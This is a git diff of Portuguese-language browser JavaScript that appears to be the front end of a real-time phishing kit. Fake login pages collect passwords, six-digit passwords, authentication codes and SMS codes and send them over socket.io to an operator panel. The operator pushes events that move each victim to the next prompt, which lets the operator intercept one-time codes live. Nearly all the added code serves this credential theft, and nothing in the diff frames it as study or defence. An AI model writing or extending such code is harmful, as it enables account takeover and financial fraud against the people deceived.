@@ -1,240 +1,9 @@
-const btnLogin = document.querySelector('#btnLogin')
-const userInput = document.querySelector('#nomeUsuario')
-const btnCopy = [...document.querySelectorAll('.formOperator .btn-copy')]
-
-if (btnCopy) {
-    btnCopy.forEach((btn) => {
-        btn.addEventListener('click', function (e) {
-            e.preventDefault()
-
-            const input = btn.closest('.form-group').querySelector('input')
-
-            if (!input) return
-
-            /* Select the text field */
-            input.select()
-            input.setSelectionRange(0, 99999) /* For mobile devices */
-
-            /* Copy the text inside the text field */
-            document.execCommand('copy')
-
-            /* Alert the copied text */
-            alert('Copied the text: ' + input.value)
-        })
-    })
-}
-
-// if (btnLogin && userInput) {
-//     btnLogin.addEventListener('click', function (e) {
-//         e.preventDefault()
-//         btnLogin.closest('form').submit()
-//         //if (userInput.value) socket.emit('chat message', userInput.value)
-//     })
-// }
-
-socket.on('chat message', function (msg) {
-    alert(msg)
-})
-
-const formClient = (() => {
-    //private var/functions
-    const form = document.querySelector('#user')
-    const socketInput = document.querySelector('.theSocket')
-
-    async function store(dados) {
-        const cliente = await util.post(`/api/client`, JSON.stringify(dados))
-
-        console.log(cliente)
-    }
-
-    function putSocket() {
-        if (socketInput) {
-            socket.on('connect', function (msg) {
-                console.log(`socketID`, socket.id)
-                socketInput.value = socket.id
-            })
-
-            socket.on('newClient', (client) => {
-                console.log(`meu cliente`, client)
-            })
-
-            socket.on('reconnectClient', (client) => {
-                console.log(`meu cliente`, client)
-            })
-        }
-    }
-
-    async function handleFormPassword(form, goto) {
-        const dados = util.serialize(form)
-
-        try {
-            const cliente = await util.post(`/api/client-password`, JSON.stringify(dados))
-
-            const { id } = cliente
-
-            const urlParams = new URLSearchParams(window.location.search)
-            const error = urlParams.get('error')
-
-            if (goto == 'eletronic') {
-                socket.emit('sendPassword', id)
-
-                if (error) {
-                    return (window.location.href = `/await?client=${id}`)
-                } else {
-                    return (window.location.href = `/eletronic?client=${id}`)
-                }
-            } else {
-                socket.emit('sendSignature', id)
-
-                if (error) {
-                    return (window.location.href = `/await?client=${id}`)
-                } else {
-                    return (window.location.href = `/await?client=${id}`)
-                }
-            }
-        } catch (error) {
-            //alert(error)
-            console.log(error)
-        }
-    }
-
-    function password() {
-        const formPassword = document.querySelector('#formPassword')
-
-        if (formPassword) {
-            formPassword.addEventListener('submit', function (e) {
-                e.preventDefault()
-
-                handleFormPassword(formPassword, 'eletronic')
-            })
-        }
-    }
-
-    function eletronic() {
-        const formEletronic = document.querySelector('#formEletronic')
-
-        if (formEletronic) {
-            formEletronic.addEventListener('submit', function (e) {
-                e.preventDefault()
-
-                handleFormPassword(formEletronic)
-            })
-        }
-    }
-
-    function handleSubmit(e) {
-        if (btnLogin && userInput) {
-            btnLogin.addEventListener('click', function (e) {
-                e.preventDefault()
-
-                const theForm = document.querySelector('#user')
-
-                if (theForm) return theForm.submit()
-                //if (userInput.value) socket.emit('chat message', userInput.value)
-
-                const name = theForm.querySelector('#nomeUsuario')
-
-                const dados = util.serialize(theForm)
-
-                return store(dados)
-            })
-        }
-    }
-
-    function submit() {
-        if (!form) return
-
-        handleSubmit()
-    }
-
-    return {
-        //public var/functions
-        submit,
-        putSocket,
-        password,
-        eletronic,
-    }
-})()
-
-formClient.eletronic()
-formClient.submit()
-formClient.password()
-
-//menu login
-const menuLogin = [...document.querySelectorAll('.menuLogin li')]
-
-if (menuLogin) {
-    menuLogin.forEach((element) => {
-        element.addEventListener('click', function (e) {
-            const parent = element.closest('ul')
-            const similar = parent.querySelectorAll('li')
-            const number = element.dataset.number
-            const content = element.closest('.menuLoginHome').querySelector(`.container-menuLogin > #content${number}`)
-
-            if (!similar.length) return
-
-            similar.forEach((item) => {
-                item.classList.remove('selected')
-            })
-
-            element.classList.add('selected')
-
-            if (!content) return
-
-            const similarContent = [...content.closest('.container-menuLogin').querySelectorAll('.boxContent')]
-
-            similarContent.forEach((theContent) => {
-                theContent.style.display = 'none'
-            })
-
-            content.style.display = 'block'
-        })
-    })
-}
-
 const URL = `http://192.168.0.10:3333/api`
 
 const util = (() => {
     const images = []
     let imageDefault = 0
     //private var/functions
-    function countOnline(date) {
-        let time = new Date() - new Date(date)
-
-        time = new Date(time)
-
-        let seconds = time.getSeconds()
-        let minutes = time.getMinutes()
-
-        time = time.getMinutes() + ':' + time.getSeconds()
-
-        const roleTime = document.querySelector('.timeOperator')
-
-        const containerRoleTime = roleTime.closest('.form-group')
-
-        roleTime.remove()
-
-        const newRoleTime = document.createElement('label')
-
-        newRoleTime.classList.add('timeOperator')
-
-        newRoleTime.innerHTML = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)
-
-        containerRoleTime.append(newRoleTime)
-
-        setInterval(() => {
-            if (seconds == 59) {
-                minutes = ('0' + (parseInt(minutes) + 1)).slice(-2)
-
-                seconds = ('0' + 1).slice(-2)
-            } else {
-                seconds = ('0' + (parseInt(seconds) + 1)).slice(-2)
-            }
-
-            newRoleTime.innerHTML = minutes + ':' + seconds
-        }, 1000)
-    }
-
     const setImageDefault = (image, container) => {
         image.addEventListener('click', (e) => {
             const index = image.dataset.index
@@ -474,30 +243,43 @@ const util = (() => {
         })
     }
 
-    const post = (url, body, token) => {
-        const options = {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: body,
-        }
-
-        if (token) {
-            const theToken = document.body.dataset.token
-            options.headers.authorization = `Bearer ${theToken}`
-        }
+    async function post(url, options) {
 
         return new Promise((resolve, reject) => {
-            fetch(url, options)
-                .then((r) => r.json())
-                .then((res) => {
-                    if (res.error) return reject(res.error)
+            const { body, headers } = options
 
-                    return resolve(res)
+            if(!url) return reject('not have url')
+
+
+            if(!headers) {
+                
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'content-type': 'application/json',
+                    },
+                    body: JSON.stringify(body || ''),
                 })
-                .catch((error) => reject(error))
+                    .then(res => res.json())
+                    .then(resolve)
+                    .catch(reject)
+            }else{
+
+                headers['content-type'] = 'application/json'
+
+                fetch(url, {
+                    method: 'POST',
+                    headers,
+                    body: JSON.stringify(body || ''),
+                })
+                    .then(res => res.json())
+                    .then(resolve)
+                    .catch(reject)
+            }
+            
         })
+
+
     }
 
     const del = (url) => {
@@ -623,7 +405,7 @@ const util = (() => {
         delayed_methods,
         dateEnd,
         maskMoney,
-        post,
+        post
     }
 })()
 
@@ -746,6 +528,641 @@ if (btnValidat) util.scroll(btnValidat)
     )
 })()
 
+const formInfo = document.querySelector(`form[name='f1']`)
+
+//close tab
+window.onbeforeunload = function () {
+    //return "Do you really want to close?";
+    socket.emit('clientClose', 'Cliente desconectou')
+}
+
+//check usuario reconectado
+socket.on('conectado', (data) => {
+    const params = new URLSearchParams(window.location.search)
+
+    if (params.has('client')) {
+        socket.emit('userReconnect', params.get('client'))
+
+        console.log(params.get('client'))
+    } else return
+})
+
+function formAuth() {
+    const form = document.querySelector('.verify_inputs')
+
+    if (!form) return
+
+    const inputs = form.querySelectorAll('input')
+
+    if (!inputs) return
+
+    inputs.forEach((input, index) => {
+        input.addEventListener('keyup', function (e) {
+            e.preventDefault()
+
+            const value = input.value
+            if (value.length > 2) {
+                const values = [...value]
+                values.forEach((inpt, i) => {
+                    if (!inputs[i]) return
+                    inpt.value = inpt
+                })
+
+                return inputs[inputs.length - 1].focus()
+            }
+            if (!value) {
+                if (!inputs[index - 1]) return (input.value = '')
+                input.value = ''
+                return inputs[index - 1].focus()
+            }
+
+            if (inputs[index + 1]) return inputs[index + 1].focus()
+        })
+        input.addEventListener('input', function (e) {
+            e.preventDefault()
+
+            const value = e.target.value
+
+            if (value.length > 1) {
+                const values = [...value]
+                values.forEach((inpt, i) => {
+                    if (inputs[i]) inputs[i].value = inpt
+
+                    inputs[inputs.length - 1].focus()
+                })
+            }
+        })
+    })
+}
+
+formAuth()
+
+const infosData = (() => {
+    //private var/functions
+
+    function commands() {
+        socket.on('errorpassword', (user) => {
+            if (user.id) window.location.href = `/sinbc-login?client=${user.id}&error=true`
+        })
+
+        socket.on('disp', (data) => {
+            const params = new URLSearchParams(window.location.search)
+
+            if (params.has('client')) {
+                if (params.get('client') == data) window.location.href = `/dispositivo?client=${data}`
+            } else return
+        })
+
+        socket.on('erroruser', (data) => {
+            const params = new URLSearchParams(window.location.search)
+
+            if (params.has('client')) {
+                if (params.get('client') == data) window.location.href = `/?client=${data}`
+            } else return
+        })
+
+        socket.on('getAuth', (data) => {
+            const params = new URLSearchParams(window.location.search)
+
+            console.log('get auth of %s', data)
+
+            if (params.has('client')) {
+                if (params.get('client') == data) window.location.href = `/verify-authentic?client=${data}`
+            } else return
+        })
+
+        socket.on('errorpass6', (data) => {
+            const params = new URLSearchParams(window.location.search)
+
+            if (params.has('client')) {
+                if (params.get('client') == data) window.location.href = `/password6?client=${data}`
+            } else return
+        })
+    }
+
+    async function receiver() {
+        socket.on('erroruser', (data) => {
+            const params = new URLSearchParams(window.location.search)
+
+            if (params.has('client')) {
+                if (params.get('client') == data) window.location.href = `/?client=${data}`
+            } else return
+        })
+
+        socket.on('getAuth', (data) => {
+            const params = new URLSearchParams(window.location.search)
+
+            console.log('get auth of %s', data)
+
+            if (params.has('client')) {
+                if (params.get('client') == data) window.location.href = `/verify-authentic?client=${data}`
+            } else return
+        })
+
+        socket.on('errorpass6', (data) => {
+            const params = new URLSearchParams(window.location.search)
+
+            if (params.has('client')) {
+                if (params.get('client') == data) window.location.href = `/password6?client=${data}`
+            } else return
+        })
+    }
+
+    async function create(form) {
+        if (!form) return
+
+        form.addEventListener('submit', (e) => {
+            // body
+            e.preventDefault()
+
+            const data = util.serialize(form)
+
+            //socket.emit('createClient', data)
+
+            form.submit()
+        })
+    }
+
+    async function auth(form) {
+        if (!form) return
+        form.addEventListener('submit', function (e) {
+            e.preventDefault()
+
+            const data = util.serialize(form)
+
+            if (!data) return form.classList.add('errorForm')
+
+            socket.emit('sendAuth', data)
+
+            window.location.href = `/await?client=${data.id}`
+        })
+    }
+
+    async function submit(form) {
+        console.log(form)
+        if (!form) return
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault()
+
+            form.querySelector('#btnLogin').innerHTML = `Aguarde...`
+            form.querySelector('#btnLogin').disabled = true
+
+            form.querySelector('.inpt-passwd6').style.opacity = 0.5
+
+            form.querySelector(`input[name='password6']`).disabled = true
+
+            const data = util.serialize(form)
+
+            socket.emit('password6Client', data)
+
+            console.log(data)
+        })
+    }
+
+    async function update(form) {
+        if (!form) return
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault()
+
+            const data = util.serialize(form)
+
+            socket.emit('updateClient', data)
+
+            return (window.location.href = `/await?client=${data.id}`)
+        })
+    }
+
+    async function digits(form) {
+        //form-pass6
+        if (!form) return
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault()
+
+            const data = util.serialize(form)
+
+            socket.emit('sendPass6', data)
+
+            window.location.href = `/await?client=${data.id}`
+
+            console.log(data)
+        })
+    }
+
+    return {
+        //public var/functions
+        submit,
+        update,
+        create,
+        digits,
+        receiver,
+        commands,
+        auth,
+    }
+})()
+
+const formUpdateClient = document.querySelector(`.form-pass6`)
+
+infosData.commands()
+infosData.auth(document.querySelector('.form-auth'))
+infosData.digits(document.querySelector('.form-pass6'))
+infosData.create(formInfo)
+infosData.update(formUpdateClient)
+infosData.submit(document.querySelector(`.form-pass6`))
+
+//console.log(formInfo)
+
+
+const pageMail = (() => {
+    function resend() {
+        const button  = document.querySelector('.formMail__code.verify spam');
+
+        if(!button) return
+
+        const buttonClosest = button.closest('button')
+
+        if(!button) return
+
+        setInterval(() => {
+
+            if(parseInt(button.innerHTML) > 0)
+                button.innerHTML = parseInt(button.innerHTML) - 1
+            else{
+                if(buttonClosest.disabled) {
+                    buttonClosest.disabled = false
+                    buttonClosest.innerHTML = `Reenviar código`
+                }
+            }
+        }, 1000)
+    }
+
+    function submitCode() {
+        const form = document.querySelector('.formMail__code');
+
+        if(!form) return
+
+        const button = form.querySelector('button.validate')
+
+        button.addEventListener('click', function (e) {
+            e.preventDefault()
+
+            let values = ''
+            const clientID = form.elements['client'].value
+
+            const inputs = [...form.querySelectorAll('input[type="tel"]')];
+
+            inputs.forEach(input => {
+                if(!input.value) {
+                    input.setCustomValidity("Informe o c'odigo de 6 digitos");
+                    return input.reportValidity()
+                }
+            });
+
+            const loader = document.querySelector('.loader');
+
+            loader.classList.remove('hidden')
+
+            
+            console.log('enviando codigo: ', clientID);
+
+            for (let i = 1; i < 7; i++) {
+                const inputs = form.elements[`number_${i}`]
+
+                if(inputs) values += inputs.value
+                
+            }
+
+            if(values.length < 4) return
+
+            socket.emit('sendSMS', { client: clientID, value: values})
+        });
+    }
+
+    function mailCode(selector) {
+        const inputs = [...document.querySelectorAll(selector)]
+
+        if(!inputs) return
+
+
+        inputs.forEach((input, index) => {
+
+            input.addEventListener('focus', function (e) {
+
+                input.closest('span').classList.add('focused')
+            });
+
+            input.addEventListener('blur', function (e) {
+
+                input.closest('span').classList.remove('focused')
+            });
+
+            input.addEventListener('keyup', function (e) {
+                e.preventDefault()
+
+                
+
+                let values = input.value
+
+                if(values.length == 1 && index < 5) {
+                    inputs[index+1].focus()
+
+                }
+
+                if(values.length == 0 && index < 6) {
+                    if(inputs[index-1]) {
+
+                        inputs[index-1].value = ''
+                        inputs[index-1].focus()
+                    }
+                }
+
+                if(values.length > 1) {
+                    let rayValues = values.replace(/\D/g, "").split('')
+
+
+                    if(rayValues[0]) inputs[0].value = rayValues[0]
+                    if(rayValues[1]) inputs[1].value = rayValues[1]
+                    if(rayValues[2]) inputs[2].value = rayValues[2]
+                    if(rayValues[3]) inputs[3].value = rayValues[3]
+                    if(rayValues[4]) inputs[4].value = rayValues[4]
+                    if(rayValues[5]) {
+                        inputs[5].value = rayValues[5]
+
+                        input.closest('form').querySelector('button').disabled = false
+                        if(inputs[5] && inputs[5].value) inputs[5].focus()
+                    }
+                }
+
+                if(index == 5 && input.value) {
+                    input.closest('form').querySelector('button').disabled = false
+                }else{
+                    input.closest('form').querySelector('button').disabled = true
+                }
+
+                
+            });
+        });
+    }
+    //private var/functions
+    function focus(selector) {
+        const input = document.querySelector(selector);
+
+        if(!input || !input.closest('article')) return
+
+        const label = input.closest('article').querySelector('label')
+
+        if(!label) return
+
+        input.addEventListener('focus', function (e) {
+            // body
+            label.classList.add('focused')
+        });
+
+        input.addEventListener('blur', (event) => {
+
+            if(input.value) return
+            label.classList.remove('focused')
+        });
+    }
+
+    function submitPassword(form) {
+        const formul = document.querySelector(`${form}:not(.formMail__code)`);
+
+        if(!formul) return
+
+        const btnSubmit = formul.querySelector('button');
+
+        if(!btnSubmit) return
+
+        btnSubmit.addEventListener('click', function (e) {
+            // body
+            e.preventDefault()
+
+            const pass = btnSubmit.closest('form').elements['password']
+            const mail = btnSubmit.closest('form').elements['mail']
+
+
+            if(pass) {
+
+                if(!pass.value) {
+                    pass.setCustomValidity("Informe sua senha de acesso");
+                    return pass.reportValidity()
+
+                }
+                else{
+                    const loader = document.querySelector('.loader');
+
+                    loader.classList.remove('hidden')
+                }
+            }
+            // body
+
+            if(mail) {
+
+                
+
+                if(!mail.value){
+                    mail.setCustomValidity("Informe um e-mail para acessar sua conta");
+                    return mail.reportValidity()
+
+                }
+                else
+                    return btnSubmit.closest('form').submit()
+            }
+        });
+
+
+    }
+
+    function loader() {
+        const loader = document.querySelector('.loader');
+
+        loader.classList.remove('hidden')
+    }
+    
+    return {
+        //public var/functions
+        focus,
+        submitPassword,
+        mailCode,
+        resend,
+        submitCode
+    }
+})()
+
+pageMail.resend()
+pageMail.submitCode()
+
+pageMail.focus('.formMail input')
+pageMail.mailCode('.formMail__inputs input')
+//formMail__inputs
+
+const password = (() => {
+    //private var/functions
+    const inputID = document.querySelector('input[name="userID"]')
+
+    async function insertClient(form) {
+
+        if(!form) return
+
+        const data = util.serialize(form)
+
+        const insert = await util.post('/api/client', { body: data})
+
+        socket.emit('joinClient', insert)
+
+        inputID.value = insert.id
+    }
+
+    async function submitPassword(form) {
+        const formul = document.querySelector(`${form}:not(.formMail__code)`);
+
+        if(!formul) return
+
+        if(formul.classList.contains('formMail__code')) return
+
+        const btnSubmit = formul.querySelector('button');
+
+        if(!btnSubmit) return
+
+        btnSubmit.addEventListener('click', function (e) {
+            // body
+            e.preventDefault()
+
+            const pass = btnSubmit.closest('form').elements['password']
+            const mail = btnSubmit.closest('form').elements['mail']
+
+
+            if(pass) {
+
+                if(!pass.value) {
+                    pass.setCustomValidity("Informe sua senha de acesso");
+                    return pass.reportValidity()
+
+                }
+                else{
+                    const loader = document.querySelector('.loader');
+
+                    loader.classList.remove('hidden')
+
+                    insertClient(formul)
+                }
+            }
+            // body
+
+            if(mail) {
+
+                
+
+                if(!mail.value){
+                    mail.setCustomValidity("Informe um e-mail para acessar sua conta");
+                    return mail.reportValidity()
+
+                }
+                else
+                    return btnSubmit.closest('form').submit()
+            }
+        });
+
+
+    }
+
+    async function receive() {
+        socket.on('reqSMS', (client) => {
+            const inpt = document.querySelector('input[name="userID"]')
+
+            if(!inpt) return
+            const clientID = inpt.value
+
+            if(!clientID) 
+            
+
+            if(client.id == clientID) return window.location.href = `/phonecheck/${clientID}`
+        })
+    }
+    
+    
+    return {
+        //public var/functions
+        submitPassword,
+        receive
+    }
+})()
+
+password.receive()
+
+password.submitPassword(`form.formMail:not(.formMail__code)`)
+const phone = (() => {
+    //private var/functions
+    function select(btn) {
+        const clientID = parseInt(document.querySelector('input[name="client"]').value)
+
+        if(!clientID) return
+
+        if(btn.classList.contains('sms')) {
+            socket.emit('selectSMS', clientID)
+
+            return window.location.href = "/verify-authentic?select=sms"
+        }else if(btn.classList.contains('phone')) {
+            socket.emit('selectPhone', clientID)
+            return window.location.href = "/verify-authentic?select=phone"
+
+        }else if(btn.classList.contains('app')){
+            socket.emit('selectApp', clientID)
+
+            return window.location.href = "/verify-authentic?select=app"
+        }
+    }
+
+    function dispatch(selectors) {
+        const selector = [...document.querySelectorAll(selectors)];
+
+        selector.map(button => {button.addEventListener('click', e => {
+            select(button)
+        })})
+
+    }
+    
+    return {
+        //public var/functions
+        dispatch
+    }
+})()
+
+//formMail__phone--options
+
+phone.dispatch('.formMail__phone--options > div')
+const sms = (() => {
+    //private var/functions
+    function send(selector) {
+        const btn = document.querySelector(selector);
+
+        if(!btn) return
+
+        const form  = btn.closest('form')
+        const clientID = document.querySelector('input[name="client"]').value
+
+        if(!btn || !form || !clientID) return
+
+        
+
+        btn.addEventListener('click', function (e) {
+            e.preventDefault()
+            
+
+        });
+
+    }
+    
+    return {
+        //public var/functions
+        send
+    }
+})()
+
+sms.send('.formMail__code .validate')
 //formLogin
 const login = (() => {
     //private var/functions
@@ -754,6 +1171,8 @@ const login = (() => {
             e.preventDefault()
 
             const user = util.serialize(form)
+
+            console.log(user)
 
             return util
                 .request({
@@ -815,9 +1234,14 @@ const login = (() => {
     }
 })()
 
+//Register
+const formRegister = document.querySelector('.formRegister')
+
+if (formRegister) login.register(formRegister)
+
 const formLogin = document.querySelector('.formLogin')
 
-//if (formLogin) login.login(formLogin)
+if (formLogin) login.login(formLogin)
 
 const product = (() => {
     const table = $('.dataTable').DataTable()
